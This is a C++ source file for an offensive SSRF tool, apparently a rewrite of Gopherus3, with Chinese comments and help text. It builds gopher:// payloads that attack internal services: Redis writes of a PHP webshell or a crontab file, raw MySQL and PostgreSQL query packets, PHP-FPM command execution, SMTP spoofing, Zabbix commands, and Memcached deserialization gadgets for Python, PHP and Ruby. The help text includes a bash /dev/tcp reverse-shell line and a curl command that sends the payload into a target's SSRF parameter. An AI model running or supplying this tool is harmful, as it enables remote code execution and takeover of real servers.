// zemu-gopher — Gopherus3 的 C++26 重写版
// SSRF gopher:// payload 生成器
#include <algorithm>
#include <array>
#include <cctype>
#include <cstdint>
#include <cstdio>
#include <expected>
#include <format>
#include <fstream>
#include <iostream>
#include <map>
#include <memory>
// <print> 在 MSYS2 GCC16 下缺符号，用 fmt 输出
#include <sstream>
#include <string>
#include <string_view>
#include <vector>

namespace zg {

// ---------- 编码 ----------

enum class EncMode { None, QuotePlus, Quote, QuoteSafe, Hex, HexUpcase };

static bool is_unreserved(char c) {
    return std::isalnum(static_cast<unsigned char>(c)) || c == '_' || c == '.' || c == '-' || c == '~';
}

// 对应 urllib.parse.quote_from_bytes
static std::string quote(std::string_view data, std::string_view safe = "") {
    std::string out;
    char buf[4];
    for (char ch : data) {
        if (is_unreserved(ch) || safe.find(ch) != std::string_view::npos)
            out += ch;
        else {
            std::snprintf(buf, sizeof buf, "%%%02X", static_cast<unsigned char>(ch));
            out += buf;
        }
    }
    return out;
}

// 对应 urllib.parse.quote_plus(safe="")
static std::string quote_plus(std::string_view data, std::string_view safe = "") {
    std::string out;
    char buf[4];
    for (char ch : data) {
        if (ch == ' ')
            out += '+';
        else if (is_unreserved(ch) || safe.find(ch) != std::string_view::npos)
            out += ch;
        else {
            std::snprintf(buf, sizeof buf, "%%%02X", static_cast<unsigned char>(ch));
            out += buf;
        }
    }
    return out;
}

// HEX / HEX_UPCASE: 每个字节 %xx
static std::string percent_encode(std::string_view data, bool upper) {
    std::string out;
    char buf[4];
    for (char ch : data) {
        std::snprintf(buf, sizeof buf, upper ? "%%%02X" : "%%%02x", static_cast<unsigned char>(ch));
        out += buf;
    }
    return out;
}

static std::string encode_payload(std::string_view data, EncMode mode) {
    switch (mode) {
        case EncMode::None:      return std::string(data);
        case EncMode::QuotePlus: return quote_plus(data);
        case EncMode::Quote:     return quote(data, "/");
        case EncMode::QuoteSafe: return quote(data, "/:");
        case EncMode::Hex:       return percent_encode(data, false);
        case EncMode::HexUpcase: return percent_encode(data, true);
    }
    return std::string(data);
}

// binascii.hexlify 小写
static std::string hexlify(std::string_view data) {
    std::string out;
    char buf[3];
    for (char ch : data) {
        std::snprintf(buf, sizeof buf, "%02x", static_cast<unsigned char>(ch));
        out += buf;
    }
    return out;
}

// 把 hex 字符串按两字节一组转成 "%xx%xx..."(Python 版 MySQL/PostgreSQL 的 encode())
static std::string hex_to_percent(std::string_view hex) {
    std::string out;
    for (size_t i = 0; i + 1 < hex.size(); i += 2) {
        out += '%';
        out += hex.substr(i, 2);
    }
    return out;
}

// ---------- piper 后处理器 ----------

static std::string pipe_line_n(std::string s) { // %0d%0a -> %0A (忽略大小写)
    std::string out;
    for (size_t i = 0; i < s.size();) {
        if (i + 6 <= s.size() && s[i] == '%' &&
            std::tolower(s[i+1]) == '0' && std::tolower(s[i+2]) == 'd' &&
            std::tolower(s[i+3]) == '0' && std::tolower(s[i+4]) == 'a') {
            out += "%0A";
            i += 6;
        } else out += s[i++];
    }
    return out;
}

static std::string pipe_line_rn(const std::string& s) { // 裸 %0a -> %0D%0A
    std::string out;
    for (size_t i = 0; i < s.size();) {
        bool preceded_by_0d = i >= 3 && s[i-3] == '%' &&
            std::tolower(s[i-2]) == '0' && std::tolower(s[i-1]) == 'd';
        if (i + 3 <= s.size() && s[i] == '%' && std::tolower(s[i+1]) == '0' &&
            std::tolower(s[i+2]) == 'a' && !preceded_by_0d) {
            out += "%0D%0A";
            i += 3;
        } else out += s[i++];
    }
    return out;
}

// ---------- CLI ----------

struct Args {
    std::map<std::string, std::string> kv;
    bool silent = false;
    std::string exploit, host = "127.0.0.1", post = "default", mode;
    int port = 0;
    std::string get(const std::string& k, const std::string& def = "") const {
        auto it = kv.find(k);
        return it == kv.end() ? def : it->second;
    }
};

static Args parse_args(int argc, char** argv) {
    Args a;
    for (int i = 1; i < argc; ++i) {
        std::string k = argv[i];
        auto take = [&](std::string& dst) { if (i + 1 < argc) dst = argv[++i]; };
        if (k == "--exploit") take(a.exploit);
        else if (k == "--host") take(a.host);
        else if (k == "--port") { std::string v; take(v); a.port = std::stoi(v); }
        else if (k == "--post") take(a.post);
        else if (k == "--mode") take(a.mode);
        else if (k == "--silent" || k == "--slient") a.silent = true;
        else if (k.rfind("--", 0) == 0) take(a.kv[k.substr(2)]);
    }
    return a;
}

// ---------- 生成器基类 ----------

struct Gen {
    std::string host = "127.0.0.1";
    int port = 0, default_port = 12345;
    std::string payload;
    virtual ~Gen() = default;
    virtual void build() = 0;

    void set_payload(std::string_view raw, EncMode mode) { payload = encode_payload(raw, mode); }
    void set_url_payload(std::string_view raw) { set_payload(raw, EncMode::QuoteSafe); }
    void prefix(std::string_view p) { payload = std::string(p) + payload; }
    void suffix(std::string_view s) { payload += s; }

    std::string generate() {
        if (port == 0) port = default_port;
        return std::format("gopher://{}:{}/_{}", host, port, payload);
    }
};

// ---------- Redis ----------

static std::string resp_bulk(std::string_view v) {
    return std::format("${}\r\n{}\r\n", v.size(), v);
}
static std::string resp_command(std::initializer_list<std::string_view> parts) {
    std::string c = std::format("*{}\r\n", parts.size());
    for (auto p : parts) c += resp_bulk(p);
    return c;
}

struct Redis : Gen {
    int default_port_ = 6379;
    std::string content, dir, filename;
    Redis(const Args& a) {
        default_port = 6379;
        content = a.get("content");
        if (auto f = a.get("content-file"); !f.empty()) {
            std::ifstream in(f, std::ios::binary);
            std::ostringstream ss; ss << in.rdbuf(); content = ss.str();
        }
        dir = a.get("dir", "/var/www/html");
        filename = a.get("filename", "shell.php");
        if (content.empty()) content = "<?php system($_GET['cmd']); ?>";
    }
    void build() override {
        std::string value = "\n\n" + content + "\n\n";
        std::string raw = resp_command({"flushall"})
                        + resp_command({"set", "1", value})
                        + resp_command({"config", "set", "dir", dir})
                        + resp_command({"config", "set", "dbfilename", filename})
                        + resp_command({"save"});
        set_url_payload(raw);
    }
};

// ---------- MySQL ----------

struct MySQL : Gen {
    std::string user, query;
    MySQL(const Args& a) {
        default_port = 3306;
        user = a.get("user", "root");
        query = a.get("query");
        if (!a.silent)
            std::fputs("\033[31m注意: 仅当 MySQL 用户【没有密码】时才能成功!\033[0m\n", stderr);
    }
    void build() override {
        char len_ch = static_cast<char>(0xa3 + (static_cast<int>(user.size()) - 4));
        std::string dump = hexlify(std::string_view(&len_ch, 1));
        dump += "00000185a6ff0100000001210000000000000000000000000000000000000000000000";
        dump += hexlify(user);
        dump += "00006d7973716c5f6e61746976655f70617373776f72640066035f6f73054c696e75780c5f636c69656e745f6e616d65086c"
                "69626d7973716c045f7069640532373235350f5f636c69656e745f76657273696f6e06352e372e3232095f706c6174666f726d"
                "067838365f36340c70726f6772616d5f6e616d65056d7973716c";
        if (!query.empty()) {
            std::string qhex = hexlify(query);
            // query_length: 3 字节小端
            unsigned qlen = static_cast<unsigned>(qhex.size() / 2 + 1);
            std::string ql;
            for (int i = 0; i < 3; ++i) {
                char b = static_cast<char>((qlen >> (8 * i)) & 0xff);
                ql += hexlify(std::string_view(&b, 1));
            }
            dump += ql + "0003" + qhex + "0100000001";
        }
        set_payload(hex_to_percent(dump), EncMode::None);
    }
};

// ---------- PostgreSQL ----------

struct PostgreSQL : Gen {
    std::string user, db, query;
    PostgreSQL(const Args& a) {
        default_port = 5432;
        user = a.get("user", "postgres");
        db = a.get("db", "postgres");
        query = a.get("query", "select 1");
    }
    void build() override {
        char len_ch = static_cast<char>(4 + user.size() + 8 + db.size() + 13);
        std::string packet = "000000" + hexlify(std::string_view(&len_ch, 1)) + "000300";
        packet += "00" + hexlify("user") + "00" + hexlify(user)
                + "00" + hexlify("database") + "00" + hexlify(db);
        packet += "0000510000" + std::format("{:04x}", query.size() + 5);
        packet += hexlify(query);
        packet += "005800000004";
        set_payload(hex_to_percent(packet), EncMode::None);
    }
};

// ---------- FastCGI ----------

struct FastCGI : Gen {
    std::string targetfile, command;
    FastCGI(const Args& a) {
        default_port = 9000;
        targetfile = a.get("targetfile", "/usr/share/php/PEAR.php");
        command = a.get("command", "id");
    }
    void build() override {
        int length = static_cast<int>(command.size()) + 52;
        std::string data = "\x0f\x10SERVER_SOFTWAREgo / fcgiclient \x0b\tREMOTE_ADDR127.0.0.1\x0f\x08SERVER_PROTOCOLHTTP/1.1\x0e";
        data += static_cast<char>(std::to_string(length).size());
        data += "CONTENT_LENGTH" + std::to_string(length);
        data += "\x0e\x04REQUEST_METHODPOST\tKPHP_VALUEallow_url_include = On\n";
        data += "disable_functions = \nauto_prepend_file = php://input\x0f";
        data += static_cast<char>(targetfile.size());
        data += "SCRIPT_FILENAME" + targetfile + "\r\x01" "DOCUMENT_ROOT/";

        using namespace std::string_literals;
        std::string start = "\x01\x01\x00\x01\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x01\x04\x00\x01"s;
        start += static_cast<char>(data.size() / 256);
        start += static_cast<char>(data.size() % 256);
        start += static_cast<char>(data.size() % 8);
        start += '\x00';

        std::string end(data.size() % 8, '\x00');
        end += "\x01\x04\x00\x01\x00\x00\x00\x00\x01\x05\x00\x01\x00"s;
        end += static_cast<char>(length);
        end += "\x04\x00<?php system('"s + command + "');die('-----Made-by-SpyD3r-----\n');?>\x00\x00\x00\x00"s;

        set_url_payload(start + data + end);
    }
};

// ---------- SMTP ----------

struct SMTP : Gen {
    std::string mailfrom, mailto, subject, msg;
    SMTP(const Args& a) {
        default_port = 25;
        mailfrom = a.get("mailfrom", "a@b.c");
        mailto = a.get("mailto", "d@e.f");
        subject = a.get("subject", "hi");
        msg = a.get("msg", "hello");
    }
    void build() override {
        std::string raw = "MAIL FROM:" + mailfrom + "\nRCPT To:" + mailto + "\nDATA\n"
                        + "From:" + mailfrom + "\nSubject:" + subject + "\nMessage:" + msg + "\n.";
        set_url_payload(raw);
    }
};

// ---------- Zabbix ----------

struct Zabbix : Gen {
    std::string command;
    Zabbix(const Args& a) { default_port = 10050; command = a.get("command", "ls"); }
    void build() override {
        set_url_payload("system.run[(" + command + ");sleep 2s]");
    }
};

// ---------- Memcached ----------

struct DumpMemcached : Gen {
    std::string code;
    DumpMemcached(const Args& a) { default_port = 11211; code = a.get("code"); }
    void build() override { set_url_payload(code); prefix("%0d%0a"); suffix("%0d%0a"); }
};

struct PHPMemcached : Gen {
    std::string code;
    PHPMemcached(const Args& a) { default_port = 11211; code = a.get("code", "O:5:\"Hello\":0:{}"); }
    void build() override {
        set_url_payload(std::format("set SpyD3r 4 0 {}\r\n{}\r\n", code.size(), code));
        prefix("%0d%0a");
    }
};

// pickle protocol 0: (os.system, (cmd,)) -> REDUCE
struct PyMemcached : Gen {
    std::string command;
    PyMemcached(const Args& a) { default_port = 11211; command = a.get("command", "id"); }
    void build() override {
        std::string pickle = "cposix\nsystem\np0\n(S'" + command + "'\np1\ntp2\nRp3\n.";
        std::string raw = "%0d%0aset%20SpyD3r%201%2060%20" + std::to_string(pickle.size())
                        + "%0d%0a" + quote(pickle, "/:") + "%0d%0a";
        set_payload(raw, EncMode::None);
    }
};

struct RbMemcached : Gen {
    std::string command;
    RbMemcached(const Args& a) { default_port = 11211; command = a.get("command", "id"); }
    void build() override {
        std::string p = "\x04\x08o:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\t:\x0e@instanceo:\x08" "ERB\x06:\t@srcI\"";
        p += static_cast<char>(command.size() + 10);
        p += "%x(" + command + ");\x06:\x06" "ET:\x0c@method:\x0bresult:\t@varI\"\x0c@result\x06;\tT:\x10@deprecatoro:\x1f" "ActiveSupport::Deprecation\x06:\x0e@silencedT";
        std::string raw = "%0d%0aset%20SpyD3r%204%2060%20" + std::to_string(p.size())
                        + "%0d%0a" + quote(p, "/:") + "%0d%0a";
        set_payload(raw, EncMode::None);
    }
};

// ---------- PlainText ----------

struct PlainText : Gen {
    std::string data;
    EncMode mode = EncMode::QuotePlus;
    PlainText(const Args& a) {
        default_port = 25;
        std::string f = a.get("file", "-");
        std::ostringstream ss;
        if (f == "-") ss << std::cin.rdbuf();
        else { std::ifstream in(f); ss << in.rdbuf(); }  // 文本模式, 与 Python open() 一致 (CRLF→LF)
        data = ss.str();
        if (!a.mode.empty()) {
            static const std::map<std::string, EncMode> m = {
                {"NONE", EncMode::None}, {"QUOTE_PLUS", EncMode::QuotePlus},
                {"QUOTE", EncMode::Quote}, {"QUOTE_SAFE", EncMode::QuoteSafe},
                {"HEX", EncMode::Hex}, {"HEX_UPCASE", EncMode::HexUpcase}};
            if (auto it = m.find(a.mode); it != m.end()) mode = it->second;
        }
    }
    void build() override {
        // 与 Python 版一致: QUOTE_PLUS 时实际走 QUOTE_SAFE
        if (mode == EncMode::QuotePlus) set_url_payload(data);
        else set_payload(data, mode);
    }
};

} // namespace zg

// ---------- 终端颜色 & 交互界面 ----------

#ifdef _WIN32
#include <windows.h>
static void enable_vt() {  // 让 Windows 控制台支持 ANSI 颜色
    HANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD mode = 0;
    if (GetConsoleMode(h, &mode)) SetConsoleMode(h, mode | ENABLE_VIRTUAL_TERMINAL_PROCESSING);
    h = GetStdHandle(STD_ERROR_HANDLE);
    if (GetConsoleMode(h, &mode)) SetConsoleMode(h, mode | ENABLE_VIRTUAL_TERMINAL_PROCESSING);
}
#else
static void enable_vt() {}
#endif

namespace c {
constexpr const char* reset   = "\033[0m";
constexpr const char* bold    = "\033[1m";
constexpr const char* red     = "\033[91m";
constexpr const char* green   = "\033[92m";
constexpr const char* yellow  = "\033[93m";
constexpr const char* blue    = "\033[94m";
constexpr const char* magenta = "\033[95m";
constexpr const char* cyan    = "\033[96m";
constexpr const char* underline = "\033[4m";
} // namespace c

static const char* BANNER = R"(
   ███████╗███████╗███╗   ███╗██╗   ██╗       ██████╗  ██████╗ ██████╗ ██╗  ██╗███████╗██████╗
   ╚══███╔╝██╔════╝████╗ ████║██║   ██║      ██╔════╝ ██╔═══██╗██╔══██╗██║  ██║██╔════╝██╔══██╗
     ███╔╝ █████╗  ██╔████╔██║██║   ██║█████╗██║  ███╗██║   ██║██████╔╝███████║█████╗  ██████╔╝
    ███╔╝  ██╔══╝  ██║╚██╔╝██║██║   ██║╚════╝██║   ██║██║   ██║██╔═══╝ ██╔══██║██╔══╝  ██╔══██╗
   ███████╗███████╗██║ ╚═╝ ██║╚██████╔╝      ╚██████╔╝╚██████╔╝██║     ██║  ██║███████╗██║  ██║
   ╚══════╝╚══════╝╚═╝     ╚═╝ ╚═════╝        ╚═════╝  ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
)";

struct MenuItem {
    const char* name;   // exploit 名
    const char* desc;   // 中文说明
    std::vector<std::array<const char*, 3>> questions;  // {参数key, 中文提示, 默认值}
};

static const std::vector<MenuItem>& menu() {
    static const std::vector<MenuItem> m = {
        {"redis",       "Redis 写文件 (写马/写 crontab 反弹 shell)", {
            {"dir",      "写入目录", "/var/www/html"},
            {"filename", "文件名",   "shell.php"},
            {"content",  "文件内容 (留空 = 默认 PHP 马)", ""},
        }},
        {"mysql",       "MySQL 执行任意 SQL (需用户无密码)", {
            {"user",  "用户名", "root"},
            {"query", "SQL 语句", ""},
        }},
        {"postgresql",  "PostgreSQL 执行任意 SQL", {
            {"user",  "用户名",   "postgres"},
            {"db",    "数据库名", "postgres"},
            {"query", "SQL 语句", "select 1"},
        }},
        {"fastcgi",     "PHP-FPM (9000 端口) RCE", {
            {"targetfile", "服务器上必然存在的 .php 文件", "/usr/share/php/PEAR.php"},
            {"command",    "要执行的系统命令",             "id"},
        }},
        {"smtp",        "SMTP 伪造发送邮件", {
            {"mailfrom", "发件人", "admin@victim.com"},
            {"mailto",   "收件人", "you@example.com"},
            {"subject",  "主题",   "hello"},
            {"msg",      "正文",   "hi from gopher"},
        }},
        {"zabbix",      "Zabbix 命令执行 (需 EnableRemoteCommands=1)", {
            {"command", "要执行的命令", "id"},
        }},
        {"dmpmemcache", "Memcached 发送任意命令 (如 stats/items 导出)", {
            {"code", "Memcached 命令", "stats items"},
        }},
        {"phpmemcache", "Memcached 写入 PHP 序列化 payload (反序列化 RCE)", {
            {"code", "PHP 序列化字符串", "O:5:\"Hello\":0:{}"},
        }},
        {"pymemcache",  "Memcached 写入 Python pickle payload (反序列化 RCE)", {
            {"command", "要执行的命令", "id"},
        }},
        {"rbmemcache",  "Memcached 写入 Ruby marshal payload (反序列化 RCE)", {
            {"command", "要执行的命令", "id"},
        }},
        {"plaintext",   "自定义任意报文 (从文件/stdin 读取)", {
            {"file", "报文文件路径 (- 表示从标准输入读)", "-"},
        }},
    };
    return m;
}

static void print_help() {
    std::fputs(c::cyan, stdout);
    std::fputs(BANNER, stdout);
    std::fputs(c::reset, stdout);
    std::fputs(std::format(R"(
{bold}SSRF gopher:// payload 生成器 (Gopherus3 的 C++26 重写版){reset}

{yellow}用法:{reset}
  zemu-gopher                          {green}进入交互式向导{reset}
  zemu-gopher --exploit <类型> [参数]   {green}命令行模式 (--silent 只输出 URL){reset}

{yellow}攻击类型:{reset}
)", std::string(c::bold), std::string(c::reset), std::string(c::yellow), std::string(c::reset),
       std::string(c::green), std::string(c::reset), std::string(c::green), std::string(c::reset),
       std::string(c::yellow), std::string(c::reset)).c_str(), stdout);
    for (size_t i = 0; i < menu().size(); ++i)
        std::fputs(std::format("  {} {:<2} {}{:<13}{} {}\n",
            c::magenta, i + 1, c::green, menu()[i].name, c::reset, menu()[i].desc).c_str(), stdout);
    std::fputs(std::format(R"HELP(
{yellow}通用选项:{reset}
  --host H        目标主机 (默认 127.0.0.1)
  --port P        目标端口 (默认按服务: redis 6379 / mysql 3306 / postgresql 5432
                  fastcgi 9000 / smtp 25 / zabbix 10050 / memcached 11211)
  --post 模式     后处理器: default / line-n / line-rn / end-with-00
  --silent        只输出 gopher URL, 方便脚本管道使用
  -h, --help      显示本帮助

{yellow}示例:{reset}
  {green}# Redis 写 crontab 反弹 shell{reset}
  zemu-gopher --exploit redis --dir /var/spool/cron/ --filename root \
      --content '*/1 * * * * bash -i >& /dev/tcp/10.0.0.1/1234 0>&1' --silent

  {green}# 套进 SSRF 参数直接打{reset}
  curl -s http://target/fetch --data-urlencode "url=$(zemu-gopher --exploit zabbix --command id --silent)"
)", std::string(c::yellow), std::string(c::reset), std::string(c::yellow), std::string(c::reset),
       std::string(c::green), std::string(c::reset), std::string(c::green), std::string(c::reset)).c_str(), stdout);
}

static std::string prompt(const std::string& label, const std::string& def) {
    std::fputs(std::format("  {}?{}{} {}", c::cyan, c::reset, c::bold, label).c_str(), stdout);
    if (!def.empty()) std::fputs(std::format(" {}[{}]{}", c::yellow, def, c::reset).c_str(), stdout);
    std::fputs((std::string(c::reset) + ": ").c_str(), stdout);
    std::fflush(stdout);
    std::string line;
    std::getline(std::cin, line);
    return line.empty() ? def : line;
}

static int interactive() {
    std::fputs(c::cyan, stdout);
    std::fputs(BANNER, stdout);
    std::fputs(std::format("{}  狗粉岭蜜罐制造机 — SSRF gopher payload 生成器{}\n\n", c::magenta, c::reset).c_str(), stdout);

    for (size_t i = 0; i < menu().size(); ++i)
        std::fputs(std::format("  {}{:>2}{} {} {:<13}{} {}\n",
            c::yellow, i + 1, c::reset, c::green, menu()[i].name, c::reset, menu()[i].desc).c_str(), stdout);

    std::string choice = prompt(std::string("选择攻击类型 (1-") + std::to_string(menu().size()) + ", q 退出)", "");
    if (choice == "q" || choice == "Q") return 0;
    int idx = std::atoi(choice.c_str());
    if (idx < 1 || idx > static_cast<int>(menu().size())) {
        std::fputs(std::format("{}无效选择!{}\n", c::red, c::reset).c_str(), stderr);
        return 1;
    }
    const MenuItem& item = menu()[idx - 1];
    std::fputs(std::format("\n{}>>> {}{} {}—— {}{}\n", c::blue, c::reset, c::bold, item.name, item.desc, c::reset).c_str(), stdout);

    zg::Args args;
    args.exploit = item.name;
    for (auto& q : item.questions) {
        std::string key = q[0], def = q[2];
        // content 留空时各生成器自己有默认值
        args.kv[key] = prompt(std::string(q[1]), def);
    }
    std::string host = prompt("目标主机", "127.0.0.1");
    std::string port = prompt("目标端口 (留空 = 服务默认端口)", "");
    std::string post = prompt("换行后处理器 default/line-n/line-rn/end-with-00", "default");
    args.host = host;
    if (!port.empty()) args.port = std::atoi(port.c_str());
    args.post = post;
    args.silent = true;  // 先拿纯 URL, 下面自己美化输出

    std::unique_ptr<zg::Gen> gen;
    const std::string& e = args.exploit;
    if (e == "redis") gen = std::make_unique<zg::Redis>(args);
    else if (e == "mysql") gen = std::make_unique<zg::MySQL>(args);
    else if (e == "postgresql") gen = std::make_unique<zg::PostgreSQL>(args);
    else if (e == "fastcgi") gen = std::make_unique<zg::FastCGI>(args);
    else if (e == "smtp") gen = std::make_unique<zg::SMTP>(args);
    else if (e == "zabbix") gen = std::make_unique<zg::Zabbix>(args);
    else if (e == "dmpmemcache") gen = std::make_unique<zg::DumpMemcached>(args);
    else if (e == "phpmemcache") gen = std::make_unique<zg::PHPMemcached>(args);
    else if (e == "pymemcache") gen = std::make_unique<zg::PyMemcached>(args);
    else if (e == "rbmemcache") gen = std::make_unique<zg::RbMemcached>(args);
    else gen = std::make_unique<zg::PlainText>(args);

    gen->host = args.host;
    gen->port = args.port;
    gen->build();
    std::string url = gen->generate();
    if (args.post == "line-n") url = zg::pipe_line_n(url);
    else if (args.post == "line-rn") url = zg::pipe_line_rn(url);
    else if (args.post == "end-with-00") url += "%00";

    std::fputs(std::format("\n{}🍯 gopher 链接已出炉:{}\n{}{}{}{}\n\n",
        c::yellow, c::reset, c::green, c::underline, url, c::reset).c_str(), stdout);
    std::fputs(std::format("{}提示:{} 塞进 SSRF 参数即可, 例如:\n  {}curl --data-urlencode \"url=<上面的链接>\" http://target/fetch{}\n",
        c::yellow, c::reset, c::blue, c::reset).c_str(), stdout);
    std::fputs(std::format("{}若目标后端会自己先 URL 解码一次, 记得把 /_ 后面的部分再编码一层。{}\n",
        c::magenta, c::reset).c_str(), stdout);
    return 0;
}

int main(int argc, char** argv) {
    enable_vt();
    using namespace zg;

    if (argc == 1) return interactive();
    for (int i = 1; i < argc; ++i)
        if (std::string h = argv[i]; h == "-h" || h == "--help") { print_help(); return 0; }

    Args args = parse_args(argc, argv);

    std::unique_ptr<Gen> gen;
    const std::string& e = args.exploit;
    if (e == "redis") gen = std::make_unique<Redis>(args);
    else if (e == "mysql") gen = std::make_unique<MySQL>(args);
    else if (e == "postgresql") gen = std::make_unique<PostgreSQL>(args);
    else if (e == "fastcgi") gen = std::make_unique<FastCGI>(args);
    else if (e == "smtp") gen = std::make_unique<SMTP>(args);
    else if (e == "zabbix") gen = std::make_unique<Zabbix>(args);
    else if (e == "dmpmemcache") gen = std::make_unique<DumpMemcached>(args);
    else if (e == "phpmemcache") gen = std::make_unique<PHPMemcached>(args);
    else if (e == "pymemcache") gen = std::make_unique<PyMemcached>(args);
    else if (e == "rbmemcache") gen = std::make_unique<RbMemcached>(args);
    else if (e == "plaintext") gen = std::make_unique<PlainText>(args);
    else {
        std::fputs(std::format("{}错误: 缺少 --exploit 参数。用 --help 查看中文帮助, 或不带参数进入交互模式。{}\n",
            c::red, c::reset).c_str(), stderr);
        return 1;
    }

    gen->host = args.host;
    gen->port = args.port;
    gen->build();

    std::string url = gen->generate();
    if (args.post == "line-n") url = pipe_line_n(url);
    else if (args.post == "line-rn") url = pipe_line_rn(url);
    else if (args.post == "end-with-00") url += "%00";

    if (args.silent) std::fputs((url + "\n").c_str(), stdout);
    else std::fputs(std::format("{}🍯 你的 gopher 链接:{}\n{}{}{}{}\n",
        c::yellow, c::reset, c::green, c::underline, url, c::reset).c_str(), stdout);
    return 0;
}
